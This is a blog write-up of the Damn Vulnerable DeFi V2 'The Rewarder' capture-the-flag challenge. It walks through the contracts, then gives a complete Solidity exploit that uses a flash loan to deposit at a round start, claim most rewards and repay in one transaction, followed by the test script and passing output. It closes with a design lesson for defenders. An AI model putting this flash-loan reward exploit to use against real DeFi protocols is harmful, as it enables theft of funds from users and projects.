@@ -1,0 +1,153 @@
+# Damn Vulnerable DeFi V2 - #5 The Rewarder
+
+<p className="text-xs text-right">December 1, 2021 by [patrickd](/about#patrickd)</p>
+
+import { Callout } from 'nextra/components'
+
+This is Part 2 of the [Damn Vulnerable DeFi V2](https://www.damnvulnerabledefi.xyz/v2-release.html) writeup. You can find the Setup and Challenges 1 to 4 in the [previous article](/posts/2021/11/13/damn-vulnerable-defi-v2-part-1-setup-and-challenges-1-to-4).
+
+<Callout type="warning">
+  Remember, don't read this unless you really want to be spoiled!
+</Callout>
+
+---
+
+## Code Review
+
+>There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
+>
+>Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
+>
+>You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.
+>
+>Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?
+
+This is a big one! Four contracts and even the test suite has a lot of code. And it sounds like we have to make use of flash loans in order to get rewards despite not being able to lock the loans up for 5 days?
+
+Let's not get overwhelmed and start with the [test setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/the-rewarder/the-rewarder.challenge.js) again. The flash loan pool gets a million token right from the start, and each of the 4 people mentioned get 100 DVT, which are immediately deposited by them into the rewarder pool. After this initial setup, time is advanced by 5 days and a round of rewards is paid out: 25 reward tokens for each person.
+
+The success conditions require that the participants so far, only get 0.01 or less reward tokens, while the attacker earns nearly 100 tokens. All of this must happen in the next round and the attacker may not have any DVT tokens at the end (cause he is supposed to borrow them).
+
+Starting with the contract I expect to have the least code, [RewardToken.sol](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/the-rewarder/RewardToken.sol) is a relatively simple ERC20 token, with the only difference to DVT that its creator may mint unlimited amounts of it. I didn't expect anything to stand out here but actually that "`@dev A mintable ERC20 with 2 decimals to issue rewards`" comment is rather strange. That is because the default `decimals()` function of OpenZeppelin's ERC20 implementation returns `18` and there's nothing in RewardToken overriding that. Did we already stumble upon the issue? Inconsistent handling of decimals? Or just an oversight from the refactoring to v2?
+
+Let's next look at [FlashLoanerPool.sol](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/the-rewarder/FlashLoanerPool.sol) since we should be fairly familiar with it at this point and it's probably the tool we're supposed to use to exploit the rewarder contract with. And yes, it's the typical pattern, just this time the borrowing contract needs to implement a `receiveFlashLoan(uint256)` function to be notified about the loan.
+
+Next [AccountingToken.sol](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/the-rewarder/AccountingToken.sol), which I expect are given in return for DVT deposits made into the rewarder contract? It looks more complicated than it is: Basically its creator may freely mint and burn tokens, to and from any address. Transfers and allowances appear to have been disabled. And it's possible to create snapshots of the current balances (accessible via `balanceOfAt()`), that are likely made for each round of rewards. See [OpenZeppelin's ERC20 Snapshot](https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot) extension for more information.
+
+Finally we look at where the magic is supposed to happen, [TheRewarderPool.sol](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/the-rewarder/TheRewarderPool.sol)'s constructor looks as expected: It deploys the accounting and reward token contracts, and then creates the first snapshot starting the first round. The inline comment "`// Assuming all three tokens have 18 decimals`" stands a bit out though, while it's correct it's in conflict with the pevious comment we found in the RewardToken contract.
+
+Continuing on, it has 3 public/external functions that can be called by anyone: `deposit(uint)`, `withdraw(uint)` and `distributeRewards()`. Deposit and withdraw do just about what you would expect, they exchange your DVT with the accounting tokens, with the only difference that depositing also triggers the reward distribution function. `distributeRewards()` first checks whether enough time has passed to start a new round, if so it creates a snapshot. Either way, it calculates the callers rewards based on how much he has deposited compared to all other users. It then checks whether the caller has already retrieved their reward for the current round, if not, the calculated amount of reward tokens is minted.
+
+After understanding how reward distribution works, I finally noticed the issue: If you time it right and start the new round with your deposit, you can claim the reward for that round immediately and withdraw. Doing all of that from another contract, meaning in a single transaction, you can make use of a flashloan and claim the majority of the rewards. I'm not quite sure about this yet though, since it requires you to manipulate time and seems a bit easy to be honest - but let's try it:
+
+---
+
+## Exploit
+
+```solidity showLineNumbers filename="RewarderExploit.sol" {45-63} copy
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IDamnValuableToken {
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+}
+
+interface IRewardToken {
+    function transfer(address recipient, uint256 amount) external returns (bool);
+}
+
+interface ITheRewarderPool {
+    function liquidityToken() external returns (IDamnValuableToken);
+    function rewardToken() external returns (IRewardToken);
+    function deposit(uint256 amountToDeposit) external;
+    function withdraw(uint256 amountToWithdraw) external;
+    function distributeRewards() external returns (uint256);
+}
+
+interface IFlashLoanerPool {
+    function flashLoan(uint256 amount) external;
+}
+
+interface IFlashLoanReceiver {
+    function receiveFlashLoan(uint256 amount) external;
+}
+
+contract RewarderExploit is IFlashLoanReceiver {
+    address immutable attacker;
+    uint256 immutable TOKENS_IN_LENDER_POOL;
+    IFlashLoanerPool immutable flashLoanerPool;
+    ITheRewarderPool immutable rewarderPool;
+    IDamnValuableToken immutable liquidityToken;
+    IRewardToken immutable rewardToken;
+    constructor(uint256 _tokensInLenderPool, address _flashLoanerPool, address _rewarderPool) {
+        attacker = msg.sender;
+        TOKENS_IN_LENDER_POOL = _tokensInLenderPool;
+        flashLoanerPool = IFlashLoanerPool(_flashLoanerPool);
+        rewarderPool = ITheRewarderPool(_rewarderPool);
+        liquidityToken = ITheRewarderPool(_rewarderPool).liquidityToken();
+        rewardToken = ITheRewarderPool(_rewarderPool).rewardToken();
+    }
+
+    // Only start the exploit if TheRewarderPool's lastRecordedSnapshotTimestamp is older than 5 days!
+    function pwn() external {
+        // Take a loan.
+        flashLoanerPool.flashLoan(TOKENS_IN_LENDER_POOL); // Triggers callback.
+    }
+
+    // The flashloan callback.
+    function receiveFlashLoan(uint256 amount) external override {
+        // Deposit all of the borrowed tokens.
+        liquidityToken.approve(address(rewarderPool), amount);
+        rewarderPool.deposit(amount); // Triggers snapshot and distribution of rewards.
+        // Transfer rewards to attacker EOA.
+        uint256 rewards = rewarderPool.distributeRewards(); // Doesn't have any effect but quickly gives us the amount of rewards.
+        rewardToken.transfer(attacker, rewards);
+        // Withdraw all of the liquidity tokens again.
+        rewarderPool.withdraw(amount);
+        // Pay back the flash loan.
+        liquidityToken.transfer(address(flashLoanerPool), amount);
+    }
+
+}
+```
+
+That's a lot of interfaces now, but I left them in place instead of importing the contracts thinking it probably makes the code more easily understood when read here on the web.
+
+Just like in the previous challenge we again have to deploy this contract and call the `pwn()` function. But this time we have to make sure to trigger the exploit only when the timing is right: We need to be the ones starting the new round.
+
+```javascript filename="the-rewarder.challenge.js" copy
+it('Exploit', async function () {
+    // Deploy exploit contract.
+    const ExploitFactory = await ethers.getContractFactory('RewarderExploit', attacker);
+    const exploit = await ExploitFactory.deploy(TOKENS_IN_LENDER_POOL, this.flashLoanPool.address, this.rewarderPool.address);
+    // We simulate waiting just long enough for the next round to start.
+    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+    // Execute exploit!
+    await exploit.pwn();
+});
+```
+
+And indeed, it appears we've solved it the intended way, I think?
+
+```bash
+ubuntu@damnsvulndefi:~/damn-vulnerable-defi$ yarn run the-rewarder
+yarn run v1.22.17
+$ yarn hardhat test test/the-rewarder/the-rewarder.challenge.js
+$ /home/ubuntu/damn-vulnerable-defi/node_modules/.bin/hardhat test test/the-rewarder/the-rewarder.challenge.js
+
+
+  [Challenge] The rewarder
+    ✓ Exploit (112ms)
+
+
+  1 passing (1s)
+
+Done in 2.62s.
+```
+
+---
+
+## Conclusion
+
+Learning? It's not so simple this time, since it wasn't a typical "vulnerability" but rather a naive implementation. Even if you'd force the round-start (snapshot) to be within a different transaction/block than the deposit of liquidity in order to prevent attacks from flash loans, a user with lots of tokens could still simply deposit them at the end of a round and withdraw immediately after claiming their rewards after the new round was started. Your protocol probably wants to incentivize long-term staking and not, short-term arbitrage trades. So it would probably be best to get rid of rounds and instead reward users for every second they are providing liquidity like many modern DeFi projects are doing today.
